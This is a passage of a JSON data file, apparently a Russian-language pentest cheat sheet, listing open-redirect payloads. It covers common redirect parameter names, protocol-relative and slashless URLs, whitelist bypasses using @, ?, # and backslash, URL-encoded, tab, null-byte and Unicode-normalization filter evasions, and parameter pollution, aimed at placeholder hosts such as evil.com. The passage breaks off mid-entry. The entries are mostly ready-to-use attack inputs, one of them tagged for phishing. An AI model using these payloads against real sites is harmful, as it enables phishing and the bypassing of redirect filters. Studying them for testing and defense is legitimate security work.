    {
      "subcategory": "Методология",
      "title": "Способы редиректа: путь и JavaScript",
      "language": "text",
      "tags": ["methodology", "path-based", "dom-based"],
      "body": "Path-based — логика редиректа берётся из пути, а не из query:\nhttps://example.com/redirect/http://malicious.com\nhttps://example.com/redirect/../http://malicious.com\n\nJavaScript-based (DOM) — приложение редиректит через JS, манипулируем переменной:\nvar redirectTo = \"http://trusted.com\";\nwindow.location = redirectTo;\nPayload: ?redirectTo=http://malicious.com"
    },
    {
      "subcategory": "Параметры",
      "title": "Типовые query-параметры для редиректа",
      "language": "text",
      "tags": ["parameters", "fuzzing", "query"],
      "body": "?checkout_url={payload}\n?continue={payload}\n?dest={payload}\n?destination={payload}\n?go={payload}\n?image_url={payload}\n?next={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n?redirect={payload}\n?return_path={payload}\n?return_to={payload}\n?return={payload}\n?returnTo={payload}\n?rurl={payload}\n?target={payload}\n?url={payload}\n?view={payload}\n/{payload}\n/redirect/{payload}"
    },
    {
      "subcategory": "Базовые",
      "title": "Протокол-относительные (//) и обход \"http\"",
      "language": "text",
      "tags": ["basic", "protocol-relative", "filter-bypass"],
      "body": "//google.com\n////google.com"
    },
    {
      "subcategory": "Базовые",
      "title": "https: без слэшей — обход фильтра \"//\"",
      "language": "text",
      "tags": ["basic", "scheme", "filter-bypass"],
      "body": "https:google.com"
    },
    {
      "subcategory": "Базовые",
      "title": "Базовые редиректы на внешний хост",
      "language": "text",
      "tags": ["basic", "payload"],
      "body": "/http://example.com\n/http:/example.com\n//example.com\n//example.com/\n///example.com\n///example.com/\n/////example.com\n/////example.com/"
    },
    {
      "subcategory": "Обход whitelist",
      "title": "Поддомен/подпапка как доверенный домен",
      "language": "text",
      "tags": ["whitelist-bypass", "phishing"],
      "body": "www.whitelisted.com.evil.com   редиректит на evil.com\n\n# Доверенный домен как папка/префикс пути (хост остаётся вашим):\nhttp://www.yoursite.com/http://www.theirsite.com/\nhttp://www.yoursite.com/folder/www.folder.com"
    },
    {
      "subcategory": "Обход whitelist",
      "title": "Символ @ — реальный хост идёт после @ (RFC 1738)",
      "language": "text",
      "tags": ["whitelist-bypass", "at-sign", "userinfo"],
      "body": "//<user>:<password>@<host>:<port>/<url-path>\nhttp://www.theirsite.com@yoursite.com/"
    },
    {
      "subcategory": "Обход whitelist",
      "title": "Символ ? — браузер трактует как /?",
      "language": "text",
      "tags": ["whitelist-bypass", "question-mark"],
      "body": "http://www.yoursite.com?http://www.theirsite.com/\nhttp://www.yoursite.com?folder/www.folder.com"
    },
    {
      "subcategory": "Обход whitelist",
      "title": "Whitelist-домен + @ / # / & / \\ перед реальным хостом",
      "language": "text",
      "tags": ["whitelist-bypass", "at-sign", "parsing"],
      "body": "http://google.com:80#@www.whitelisteddomain.tld/\nhttp://google.com:80?@www.whitelisteddomain.tld/\nhttp://google.com\\www.whitelisteddomain.tld\nhttp://google.com&www.whitelisteddomain.tld\nhttp://www.whitelisteddomain.tld.google.com\nhttp://www.whitelisteddomain.tld/https://www.google.com/\n//google.com\\@www.whitelisteddomain.tld\nhttps://:@google.com\\@www.whitelisteddomain.tld"
    },
    {
      "subcategory": "Обход whitelist",
      "title": "HTTP Parameter Pollution",
      "language": "text",
      "tags": ["whitelist-bypass", "hpp", "parameter-pollution"],
      "body": "?next=whitelisted.com&next=google.com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Backslash-трюки — обход фильтра \"//\"",
      "language": "text",
      "tags": ["filter-bypass", "backslash"],
      "body": "\\/\\/google.com/\n/\\/google.com/\n\\\\google.com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Закодированный backslash (%5c) + комбинации слэшей",
      "language": "text",
      "tags": ["filter-bypass", "backslash", "url-encode"],
      "body": "/%5cexample.com\n//%5cexample.com\n///%5cexample.com\n////%5cexample.com\nhttps://%5cgoogle.com\n/https://%5cgoogle.com\n/https:/%5cexample.com/"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Тройной/множественный слэш + path-traversal суффикс",
      "language": "text",
      "tags": ["filter-bypass", "triple-slash", "path-traversal"],
      "body": "///google.com/%2f..\n////google.com/%2f..\n//example.com/%2f%2e%2e\n///example.com/%2f%2e%2e\n////example.com/%2f%2e%2e\n//example.com/%2e%2e\n//example.com/%2e%2e%2f\n//example.com//\n///example.com//\n////example.com//\nhttps:///www.google.com/%2e%2e\nhttps:///www.google.com/%2f%2e%2e"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Закодированный TAB (%09) внутри хоста",
      "language": "text",
      "tags": ["filter-bypass", "url-encode", "whitespace"],
      "body": "/%09/google.com\n//%09/google.com\n///%09/google.com\n////%09/google.com\nhttps://%09/google.com\n/https://%09/example.com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "URL-энкод всего payload — обход keyword-фильтров",
      "language": "text",
      "tags": ["filter-bypass", "url-encode", "obfuscation"],
      "body": "# %68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d = http://google.com\n%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\nhttp://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/http://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Юникодная точка %E3%80%82 — обход фильтра \".\"",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "ideographic-dot"],
      "body": "/?redir=google。com\n//google%E3%80%82com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Нулевой байт %00 — обход blacklist-фильтра",
      "language": "text",
      "tags": ["filter-bypass", "null-byte"],
      "body": "//google%00.com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Host/Split Unicode Normalization",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "normalization"],
      "body": "https://evil.c℀.example.com   --->   https://evil.ca/c.example.com\nhttp://a.com／X.b.com"
    },
    {
      "subcategory": "Обход фильтров",
      "title": "Unicode-символы, нормализуемые к точке/слэшу",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "idna"],
